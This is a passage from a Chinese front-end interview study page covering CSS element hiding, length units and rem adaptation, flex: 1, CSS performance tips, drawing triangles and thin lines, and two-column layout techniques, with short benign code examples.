    <span class="token property">-webkit-transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span>360deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">-ms-transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span>360deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span>360deg<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="有哪些方式-css-可以隐藏页面元素"><a href="#有哪些方式-css-可以隐藏页面元素" class="header-anchor">#</a> 有哪些方式（CSS）可以隐藏页面元素</h3> <ul><li><code>opacity:0</code>：本质上是将元素的透明度将为<code>0</code>，就看起来隐藏了，但是依然占据空间且可以交互</li> <li><code>display:none</code>: 这个是彻底隐藏了元素，元素从文档流中消失，既不占据空间也不交互，也不影响布局</li> <li><code>visibility:hidden</code>: 与上一个方法类似的效果，占据空间，但是不可以交互了</li> <li><code>overflow:hidden</code>: 这个只隐藏元素溢出的部分，但是占据空间且不可交互</li> <li><code>z-index:-9999</code>: 原理是将层级放到底部，这样就被覆盖了，看起来隐藏了</li> <li><code>transform:scale(0,0)</code>: 平面变换，将元素缩放为<code>0</code>，但是依然占据空间，但不可交互</li></ul> <p><strong>display: none 与 visibility: hidden 的区别</strong></p> <ul><li>修改常规流中元素的<code>display</code>通常会造成文档重排。修改<code>visibility</code>属性只会造成本元素的重绘</li> <li>读屏器不会读取<code>display:none</code>;元素内容；会读取<code>visibility:hidden;</code>元素内容</li> <li><code>display:none</code>;会让元素完全从渲染树中消失，渲染的时候不占据任何空间；<code>visibility:hidden</code>;不会让元素从渲染树消失，渲染师元素继续占据空间，只是内容不可见</li> <li><code>display:none</code>;是非继承属性，子孙节点消失由于元素从渲染树消失造成，通过修改子孙节点属性无法显示；<code>visibility:hidden;</code>是继承属性，子孙节点消失由于继承了<code>hidden</code>，通过设置<code>visibility:visible;</code>可以让子孙节点显式</li></ul> <h3 id="说说em-px-rem-vh-vw区别"><a href="#说说em-px-rem-vh-vw区别" class="header-anchor">#</a> 说说em/px/rem/vh/vw区别</h3> <ul><li>传统的项目开发中，我们只会用到<code>px</code>、<code>%</code>、<code>em</code>这几个单位，它可以适用于大部分的项目开发，且拥有比较良好的兼容性</li> <li>从<code>CSS3</code>开始，浏览器对计量单位的支持又提升到了另外一个境界，新增了<code>rem</code>、<code>vh</code>、<code>vw</code>、<code>vm</code>等一些新的计量单位</li> <li>利用这些新的单位开发出比较良好的响应式页面，适应多种不同分辨率的终端，包括移动设备等</li> <li>在<code>css</code>单位中，可以分为长度单位、绝对单位，如下表所指示</li></ul> <table><thead><tr><th><strong>CSS单位</strong></th> <th></th></tr></thead> <tbody><tr><td>相对长度单位</td> <td><code>em</code>、<code>ex</code>、<code>ch</code>、<code>rem</code>、<code>vw</code>、<code>vh</code>、<code>vmin</code>、<code>vmax</code>、<code>%</code></td></tr> <tr><td>绝对长度单位</td> <td><code>cm</code>、<code>mm</code>、<code>in</code>、<code>px</code>、<code>pt</code>、<code>pc</code></td></tr></tbody></table> <p>这里我们主要讲述<code>px</code>、<code>em</code>、<code>rem</code>、<code>vh</code>、<code>vw</code></p> <p><strong>px</strong></p> <p><code>px</code>，表示像素，所谓像素就是呈现在我们显示器上的一个个小点，每个像素点都是大小等同的，所以像素为计量单位被分在了绝对长度单位中</p> <p>有些人会把<code>px</code>认为是相对长度，原因在于在移动端中存在设备像素比，<code>px</code>实际显示的大小是不确定的</p> <p>这里之所以认为<code>px</code>为绝对单位，在于<code>px</code>的大小和元素的其他属性无关</p> <p><strong>em</strong></p> <p><code>em</code>是相对长度单位。相对于当前对象内文本的字体尺寸。如当前对行内文本的字体尺寸未被人为设置，则相对于浏览器的默认字体尺寸（<code>1em = 16px</code>）</p> <p>为了简化 <code>font-size</code> 的换算，我们需要在<code>css</code>中的 <code>body</code> 选择器中声明<code>font-size</code>= <code>62.5%</code>，这就使 em 值变为 <code>16px*62.5% = 10px</code></p> <p>这样 <code>12px = 1.2em</code>, <code>10px = 1em</code>, 也就是说只需要将你的原来的<code>px</code> 数值除以 10，然后换上 <code>em</code>作为单位就行了</p> <p>特点：</p> <ul><li><code>em</code> 的值并不是固定的</li> <li><code>em</code> 会继承父级元素的字体大小</li> <li><code>em</code> 是相对长度单位。相对于当前对象内文本的字体尺寸。如当前对行内文本的字体尺寸未被人为设置，则相对于浏览器的默认字体尺寸</li> <li>任意浏览器的默认字体高都是 <code>16px</code></li></ul> <p>举个例子</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>big<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  我是14px=1.4rem<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>small<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>我是12px=1.2rem<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>样式为</p> <div class="language-css extra-class"><pre class="language-css"><code><span class="token selector">&lt;style&gt;
    html</span> <span class="token punctuation">{</span><span class="token property">font-size</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token comment">/*  公式16px*62.5%=10px  */</span>  
    <span class="token selector">.big</span><span class="token punctuation">{</span><span class="token property">font-size</span><span class="token punctuation">:</span> 1.4rem<span class="token punctuation">}</span>
    <span class="token selector">.small</span><span class="token punctuation">{</span><span class="token property">font-size</span><span class="token punctuation">:</span> 1.2rem<span class="token punctuation">}</span>
&lt;/style&gt;
</code></pre></div><p>这时候<code>.big</code>元素的<code>font-size</code>为<code>14px</code>，而<code>.small</code>元素的<code>font-size</code>为12px</p> <p><strong>rem(常用)</strong></p> <ul><li>根据屏幕的分辨率动态设置<code>html</code>的文字大小，达到等比缩放的功能</li> <li>保证<code>html</code>最终算出来的字体大小，不能小于<code>12px</code></li> <li>在不同的移动端显示不同的元素比例效果</li> <li>如果<code>html</code>的<code>font-size:20px</code>的时候，那么此时的<code>1rem = 20px</code></li> <li>把设计图的宽度分成多少分之一，根据实际情况</li> <li><code>rem</code>做盒子的宽度，<code>viewport</code>缩放</li></ul> <p><code>head</code>加入常见的<code>meta</code>属性</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>format-detection<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>telephone=no<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>apple-mobile-web-app-capable<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>yes<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>apple-mobile-web-app-status-bar-style<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>black<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!--这个是关键--&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>viewport<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0，minimum-scale=1.0<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>把这段代码加入<code>head</code>中的<code>script</code>预先加载</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// rem适配用这段代码动态计算html的font-size大小</span>
<span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">win</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> docEl <span class="token operator">=</span> win<span class="token punctuation">.</span>document<span class="token punctuation">.</span>documentElement<span class="token punctuation">;</span>
    <span class="token keyword">var</span> timer <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">changeRem</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">var</span> width <span class="token operator">=</span> docEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>width<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>width <span class="token operator">&gt;</span> <span class="token number">750</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 750是设计稿大小</span>
            width <span class="token operator">=</span> <span class="token number">750</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">var</span> fontS <span class="token operator">=</span> width <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment">// 把设备宽度十等分 1rem=10px</span>
        docEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>fontSize <span class="token operator">=</span> fontS <span class="token operator">+</span> <span class="token string">&quot;px&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    win<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&quot;resize&quot;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        timer <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>changeRem<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    win<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&quot;pageshow&quot;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>persisted<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">//清除缓存</span>
            <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span><span class="token punctuation">;</span>
            timer <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>changeRem<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">changeRem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>window<span class="token punctuation">)</span>
</code></pre></div><ul><li>或者使用淘宝提供的库 <a href="https://github.com/amfe/lib-flexible" target="_blank" rel="noopener noreferrer">https://github.com/amfe/lib-flexible<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul> <p><strong>vh、vw</strong></p> <p><code>vw</code> ，就是根据窗口的宽度，分成<code>100</code>等份，<code>100vw</code>就表示满宽，<code>50vw</code>就表示一半宽。（<code>vw</code> 始终是针对窗口的宽），同理，<code>vh</code>则为窗口的高度</p> <p>这里的窗口分成几种情况：</p> <ul><li>在桌面端，指的是浏览器的可视区域</li> <li>移动端指的就是布局视口</li></ul> <p>像<code>vw</code>、<code>vh</code>，比较容易混淆的一个单位是<code>%</code>，不过百分比宽泛的讲是相对于父元素：</p> <ul><li>对于普通定位元素就是我们理解的父元素</li> <li>对于<code>position: absolute;</code>的元素是相对于已定位的父元素</li> <li>对于<code>position: fixed;</code>的元素是相对于 <code>ViewPort</code>（可视窗口）</li></ul> <p><strong>总结</strong></p> <ul><li><strong>px</strong>：绝对单位，页面按精确像素展示</li> <li><strong>%</strong>：相对于父元素的宽度比例</li> <li><strong>em</strong>：相对单位，基准点为父节点字体的大小，如果自身定义了<code>font-size</code>按自身来计算（浏览器默认字体是<code>16px</code>），整个页面内<code>1em</code>不是一个固定的值</li> <li><strong>rem</strong>：相对单位，可理解为<code>root em</code>, 相对根节点<code>html</code>的字体大小来计算</li> <li><strong>vh、vw</strong>：主要用于页面视口大小布局，在页面布局上更加方便简单
<ul><li><code>vw</code>：屏幕宽度的<code>1%</code></li> <li><code>vh</code>：屏幕高度的<code>1%</code></li> <li><code>vmin</code>：取<code>vw</code>和<code>vh</code>中较小的那个（如：<code>10vh=100px 10vw=200px</code> 则<code>vmin=10vh=100px</code>）</li> <li><code>vmax</code>：取<code>vw</code>和<code>vh</code>中较大的那个（如：<code>10vh=100px 10vw=200px</code> 则<code>vmax=10vw=200px</code>）</li></ul></li></ul> <h3 id="flex布局"><a href="#flex布局" class="header-anchor">#</a> flex布局</h3> <p>很多时候我们会用到 <code>flex: 1</code> ，它具体包含了以下的意思</p> <ul><li><code>flex-grow: 1</code> ：该属性默认为 <code>0</code> ，如果存在剩余空间，元素也不放大。设置为 <code>1</code>  代表会放大。</li> <li><code>flex-shrink: 1</code> ：该属性默认为 `1 ，如果空间不足，元素缩小。</li> <li><code>flex-basis: 0%</code> ：该属性定义在分配多余空间之前，元素占据的主轴空间。浏览器就是根据这个属性来计算是否有多余空间的。默认值为 <code>auto</code> ，即项目本身大小。设置为 <code>0%</code>  之后，因为有 <code>flex-grow</code>  和 <code>flex-shrink</code> 的设置会自动放大或缩小。在做两栏布局时，如果右边的自适应元素 <code>flex-basis</code>  设为<code>auto</code>  的话，其本身大小将会是 <code>0</code></li></ul> <h3 id="如果要做优化-css提高性能的方法有哪些"><a href="#如果要做优化-css提高性能的方法有哪些" class="header-anchor">#</a> 如果要做优化，CSS提高性能的方法有哪些？</h3> <p>实现方式有很多种，主要有如下：</p> <ul><li><strong>内联首屏关键CSS</strong> <ul><li>在打开一个页面，页面首要内容出现在屏幕的时间影响着用户的体验，而通过内联<code>css</code>关键代码能够使浏览器在下载完html后就能立刻渲染</li> <li>而如果外部引用<code>css</code>代码，在解析<code>html</code>结构过程中遇到外部<code>css</code>文件，才会开始下载<code>css</code>代码，再渲染</li> <li>所以，CSS内联使用使渲染时间提前</li> <li>注意：但是较大的<code>css</code>代码并不合适内联（初始拥塞窗口、没有缓存），而其余代码则采取外部引用方式</li></ul></li> <li><strong>异步加载CSS</strong> <ul><li>在CSS文件请求、下载、解析完成之前，CSS会阻塞渲染，浏览器将不会渲染任何已处理的内容</li> <li>前面加载内联代码后，后面的外部引用css则没必要阻塞浏览器渲染。这时候就可以采取异步加载的方案，主要有如下：
<ul><li>使用javascript将<code>link</code>标签插到<code>head</code>标签最后</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 创建link标签</span>
<span class="token keyword">const</span> myCSS <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span> <span class="token string">&quot;link&quot;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
myCSS<span class="token punctuation">.</span>rel <span class="token operator">=</span> <span class="token string">&quot;stylesheet&quot;</span><span class="token punctuation">;</span>
myCSS<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">&quot;mystyles.css&quot;</span><span class="token punctuation">;</span>
<span class="token comment">// 插入到header的最后位置</span>
document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span> myCSS<span class="token punctuation">,</span> document<span class="token punctuation">.</span>head<span class="token punctuation">.</span>childNodes<span class="token punctuation">[</span> document<span class="token punctuation">.</span>head<span class="token punctuation">.</span>childNodes<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">.</span>nextSibling <span class="token punctuation">)</span>
</code></pre></div><ul><li>设置<code>link</code>标签<code>media</code>属性为<code>noexis</code>，浏览器会认为当前样式表不适用当前类型，会在不阻塞页面渲染的情况下再进行下载。加载完成后，将media的值设为<code>screen</code>或<code>all</code>，从而让浏览器开始解析CSS</li></ul> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>stylesheet<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>mystyles.css<span class="token punctuation">&quot;</span></span> <span class="token attr-name">media</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>noexist<span class="token punctuation">&quot;</span></span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token value javascript language-javascript"><span class="token keyword">this</span><span class="token punctuation">.</span>media<span class="token operator">=</span><span class="token string">'all'</span></span><span class="token punctuation">&quot;</span></span></span><span class="token punctuation">&gt;</span></span>
</code></pre></div><ul><li>通过<code>rel</code>属性将<code>link</code>元素标记为<code>alternate</code>可选样式表，也能实现浏览器异步加载。同样别忘了加载完成之后，将<code>rel</code>设回<code>stylesheet</code></li></ul> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>alternate stylesheet<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>mystyles.css<span class="token punctuation">&quot;</span></span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token value javascript language-javascript"><span class="token keyword">this</span><span class="token punctuation">.</span>rel<span class="token operator">=</span><span class="token string">'stylesheet'</span></span><span class="token punctuation">&quot;</span></span></span><span class="token punctuation">&gt;</span></span>
</code></pre></div></li></ul></li> <li><strong>资源压缩</strong> <ul><li>利用<code>webpack</code>、<code>gulp/grunt</code>、<code>rollup</code>等模块化工具，将<code>css</code>代码进行压缩，使文件变小，大大降低了浏览器的加载时间</li></ul></li> <li><strong>合理使用选择器</strong> <ul><li>css匹配的规则是从右往左开始匹配，例如<code>#markdown .content h3</code>匹配规则如下：
<ul><li>先找到<code>h3</code>标签元素</li> <li>然后去除祖先不是<code>.content</code>的元素</li> <li>最后去除祖先不是<code>#markdown</code>的元素</li></ul></li> <li>如果嵌套的层级更多，页面中的元素更多，那么匹配所要花费的时间代价自然更高</li> <li>所以我们在编写选择器的时候，可以遵循以下规则：
<ul><li>不要嵌套使用过多复杂选择器，最好不要三层以上</li> <li>使用id选择器就没必要再进行嵌套</li> <li>通配符和属性选择器效率最低，避免使用</li></ul></li></ul></li> <li><strong>减少使用昂贵的属性</strong> <ul><li>在页面发生重绘的时候，昂贵属性如<code>box-shadow/border-radius/filter/透明度/:nth-child</code>等，会降低浏览器的渲染性能</li></ul></li> <li><strong>不要使用@import</strong> <ul><li>css样式文件有两种引入方式，一种是<code>link</code>元素，另一种是<code>@import</code></li> <li><code>@import</code>会影响浏览器的并行下载，使得页面在加载时增加额外的延迟，增添了额外的往返耗时</li> <li>而且多个<code>@import</code>可能会导致下载顺序紊乱</li> <li>比如一个css文件<code>index.css</code>包含了以下内容：<code>@import url(&quot;reset.css&quot;)</code></li> <li>那么浏览器就必须先把<code>index.css</code>下载、解析和执行后，才下载、解析和执行第二个文件<code>reset.css</code></li></ul></li> <li><strong>其他</strong> <ul><li>减少重排操作，以及减少不必要的重绘</li> <li>了解哪些属性可以继承而来，避免对这些属性重复编写</li> <li><code>css Sprite</code>，合成所有<code>icon</code>图片，用宽高加上b<code>ackgroud-position</code>的背景图方式显现出我们要的<code>icon</code>图，减少了<code>http</code>请求</li> <li>把小的<code>icon</code>图片转成<code>base64</code>编码</li> <li>CSS3动画或者过渡尽量使用<code>transform</code>和o<code>pacity</code>来实现动画，不要使用<code>left</code>和<code>top</code>属性</li></ul></li></ul> <h3 id="画一条-0-5px-的线"><a href="#画一条-0-5px-的线" class="header-anchor">#</a> 画一条 0.5px 的线</h3> <ul><li>采用 <code>meta viewport</code> 的方式 <code>&lt;meta name=&quot;viewport&quot; content=&quot;initial-scale=1.0, maximum-scale=1.0, user-scalable=no&quot; /&gt;</code></li> <li>采用 <code>border-image</code> 的方式</li> <li>采用 <code>transform: scale()</code> 的方式</li></ul> <h3 id="如何画一个三角形"><a href="#如何画一个三角形" class="header-anchor">#</a> 如何画一个三角形</h3> <p>三角形原理:边框的均分原理</p> <div class="language-css extra-class"><pre class="language-css"><code><span class="token selector">div</span> <span class="token punctuation">{</span>
  <span class="token property">width</span><span class="token punctuation">:</span>0px<span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span>0px<span class="token punctuation">;</span>
  <span class="token property">border-top</span><span class="token punctuation">:</span>10px solid red<span class="token punctuation">;</span> 
  <span class="token property">border-right</span><span class="token punctuation">:</span>10px solid transparent<span class="token punctuation">;</span> 
  <span class="token property">border-bottom</span><span class="token punctuation">:</span>10px solid transparent<span class="token punctuation">;</span> 
  <span class="token property">border-left</span><span class="token punctuation">:</span>10px solid transparent<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="两栏布局-左边定宽-右边自适应方案"><a href="#两栏布局-左边定宽-右边自适应方案" class="header-anchor">#</a> 两栏布局：左边定宽，右边自适应方案</h3> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>box<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>box-left<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>box-right<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p><strong>利用float + margin实现</strong></p> <div class="language-css extra-class"><pre class="language-css"><code><span class="token selector">.box</span> <span class="token punctuation">{</span>
 <span class="token property">height</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">.box &gt; div</span> <span class="token punctuation">{</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">.box-left</span> <span class="token punctuation">{</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>
  <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>
  <span class="token property">background-color</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">.box-right</span> <span class="token punctuation">{</span>
  <span class="token property">margin-left</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>
  <span class="token property">background-color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p><strong>利用calc计算宽度</strong></p> <div class="language-css extra-class"><pre class="language-css"><code><span class="token selector">.box</span> <span class="token punctuation">{</span>
 <span class="token property">height</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">.box &gt; div</span> <span class="token punctuation">{</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">.box-left</span> <span class="token punctuation">{</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>
  <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>
  <span class="token property">background-color</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">.box-right</span> <span class="token punctuation">{</span>
  <span class="token property">width</span><span class="token punctuation">:</span> <span class="token function">calc</span><span class="token punctuation">(</span>100% - 200px<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">float</span><span class="token punctuation">:</span> right<span class="token punctuation">;</span>
  <span class="token property">background-color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p><strong>利用float + overflow实现</strong></p> <div class="language-css extra-class"><pre class="language-css"><code><span class="token selector">.box</span> <span class="token punctuation">{</span>
 <span class="token property">height</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">.box &gt; div</span> <span class="token punctuation">{</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">.box-left</span> <span class="token punctuation">{</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>
  <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>
  <span class="token property">background-color</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">.box-right</span> <span class="token punctuation">{</span>
  <span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>
  <span class="token property">background-color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p><strong>利用flex实现</strong></p> <div class="language-css extra-class"><pre class="language-css"><code><span class="token selector">.box</span> <span class="token punctuation">{</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>
  <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">.box &gt; div</span> <span class="token punctuation">{</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">.box-left</span> <span class="token punctuation">{</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>
  <span class="token property">background-color</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">.box-right</span> <span class="token punctuation">{</span>
  <span class="token property">flex</span><span class="token punctuation">:</span> 1<span class="token punctuation">;</span> // 设置flex-grow属性为1，默认为0
  <span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>
  <span class="token property">background-color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
